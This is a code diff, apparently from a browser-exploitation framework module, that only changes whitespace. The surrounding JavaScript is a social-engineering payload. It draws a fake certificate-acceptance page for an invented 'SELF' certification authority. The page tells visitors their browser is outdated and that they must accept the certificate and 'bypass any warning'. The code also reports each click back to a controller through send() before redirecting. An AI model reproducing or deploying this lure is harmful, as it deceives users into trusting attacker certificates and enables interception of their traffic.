@@ -6,8 +6,8 @@
 
   getDomain = function(url){
     return url.match(/:\/\/(www\.)?(.[^/:]+)/)[2];
-  }  
-  
+  }
+
   toggleMoreInfo = function(collapse) {
     if (collapse) {
       $("more_info_long").style.display = "none";
@@ -36,10 +36,10 @@
 		textGreen = '<b>'+domain+'</b> chose SELF&#174; to protect your security. If your browser raises any warning when continuing it means that it\'s not up-to-date. <b>Accept</b> this certificate then please consider updating your browser as soon as possible.<br><br>SELF&#174; - to make the Internet a safer place.';
 		textRed =  'Your browser raised a warning because it is not up to date. As <b>'+domain+'</b> chose SELF&#174; to protect your security you need to <b>ACCEPT</b> this certificate to view its content then please consider update your browser as soon as possible. When your browser will be up to date, it will <b>accept</b> SELF&#174;-signed certificates. Please <b>bypass any warning</b> until then.<br><br>SELF&#174; - to make the Internet a safer place.';
 	  arrows = '<div style="margin:0px 80px 0px"></div><div style="margin:0px 80px 0px"><form style="margin:15px 5px 15px 0px;padding:0px"><input type=button value=continue name=back onclick="forward()"></form></div><div style="margin:30px 80px 0px; border-top:1px solid #ccc; padding-top:6px" id=more_info_short><a href="#" onclick="toggleMoreInfo(false); return false" onmousedown="return false"><img id=twisty_closed src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAYAAACprHcmAAAANklEQVR42q3QMQoAMAgEwfz/05dcoVcEYQuFwWYL8Uhqb+Q9+WLDcYFxwDhgHDjev3n/z96TCxE/Ie1QsznxAAAAAElFTkSuQmCC" border=0 style=display:none><img id=twisty_closed_rtl src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAYAAACprHcmAAAAMklEQVQY02P4jwcwMDCg8vEpJEoxTCFBxcgK8SpGV4hTMTaF1DGZZDeTHBokhzOuGAQAxQt2mANh8/IAAAAASUVORK5CYII=" border=0 style=display:none><span i18n-content=moreInfoTitle style="margin-left:5px;margin-right:5px">read more about the SELF&#174; certification authority</span></a></div><div style="margin:30px 80px 0px; border-top:1px solid #ccc; padding-top:6px" id=more_info_long style=display:none><a href="#" onclick="toggleMoreInfo(true); return false" onmousedown="return false"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAYAAACprHcmAAAAMUlEQVQY02P4//8/A7GYgXaKgeA/0Riqg6BCFGcQUojhZnwKsXoQl0KcoYFNIW3DGQCkVyHtwOU6YQAAAABJRU5ErkJggg==" border=0><span style="margin-left:5px;margin-right:5px">read more about the SELF&#174; certification authority</span></a><p i18n-values=.innerHTML:moreInfo1>Security Enhanced Layer Factory&#174;: because nobody of us cannot realize the full potential of the Internet, unless it is a reliable place to interact and to deal. Our dependence on computers and the Internet increases every day, like our vulnerability. Daily news reports confirm a clear and present danger to all the Internet users (worms, viruses, trojans, malware, cybercrime, cyber-terrorism and related threats). These threats, mainly the very sophisticated group work of organized crime, directly harm millions of Internet users have real confidence in the Internet. Every individual or the company using the Internet has a role in the restoring of trust. SELF&#174; help people as customer or seller to feel safe by issuing SELF&#174;-signed certificate that are build to last. With SELF&#174; you will never be harmed again - Trust is our workship.</p><p i18n-values=.innerHTML:moreInfo2>Security Enhanced Layer Factory&#174;, SELF&#174; and SELF&#174; logo are registered trademarks.</p></div>';
-	    
+
     buildtpl = function(target, background, icon, text, addarrows){
         tpl='<div style="position:absolute;width:100%;height:100%;">'+background+'</div><table width="100%" cellspacing=0 cellpadding=0><td style=padding:40px valign=middle align=center><div style="width:60%; background-color:white; color:black; font-size:10pt; line-height:16pt; text-align:left; padding:20px; position:relative; -webkit-box-shadow:3px 3px 8px #200; border-radius:5px"><div style=position:absolute>'+icon+'</div><div style="margin: 0px 77px 0px; font-size:18pt; line-height: 140%; margin-bottom:6pt; font-weight:bold; color:#660000">Please accept our new SELF&#174;-Signed Certificate to ensure maximum security protection.</div><div style="margin:0px 80px 0px">'+text+'</div>';
-		
+
 		if(addarrows){
 		    tpl = tpl + arrows+'</div></td></table>';
     		target.innerHTML = tpl;
@@ -50,19 +50,19 @@
     		target.innerHTML = tpl;
 		}
   }
-  
+
   forward = function(){
     send("User continuing to "+target);
     timer=setTimeout(function(){timer2=setTimeout(function(){buildtpl(sneakydiv, backred, warning, textRed, true);},400);window.location = target;},500);
   }
-  
+
   function $(o) {return document.getElementById(o);}
 
   sendCommand = function(cmd) {
     window.domAutomationController.setAutomationId(1);
     window.domAutomationController.send(cmd);
   }
-  
+
   $j(document).attr('title', domain+" Security Enhanced Layer Factory&#174; certificate acceptance");
   imgbootstrap = document.createElement('div');
   imgbootstrap.setAttribute('style','display:none');
